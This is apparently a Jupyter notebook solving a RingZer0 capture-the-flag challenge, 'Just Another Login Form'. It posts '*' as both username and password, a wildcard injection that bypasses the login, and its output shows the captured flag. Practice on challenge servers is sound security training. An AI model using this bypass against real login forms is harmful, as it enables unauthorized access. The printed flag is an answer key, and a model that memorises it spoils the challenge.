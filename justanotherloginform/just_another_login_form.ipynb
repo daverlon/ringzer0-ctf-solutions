{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "fc2e7ddf-bf07-4e4a-8b98-415e09794d21",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "a99a3768-a693-486e-8cd4-f0c45a239ffb",
   "metadata": {},
   "outputs": [],
   "source": [
    "url = 'http://challenges.ringzer0team.com:10124/'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "911b234d-49f0-454b-a569-8742835c6013",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'FLAG-38i65201RR4B5g1oAm05fHO0QP</div>\\n                </main>\\n</body>\\n</html>'"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#data = requests.get(url)\n",
    "\n",
    "\n",
    "# post\n",
    "\n",
    "j = {\n",
    "    'username': (None, '*'),\n",
    "    'password': (None, '*'),\n",
    "}\n",
    "\n",
    "x = requests.post(url, files=j)\n",
    "\n",
    "x.text[x.text.find('FLAG'):]"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.15"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
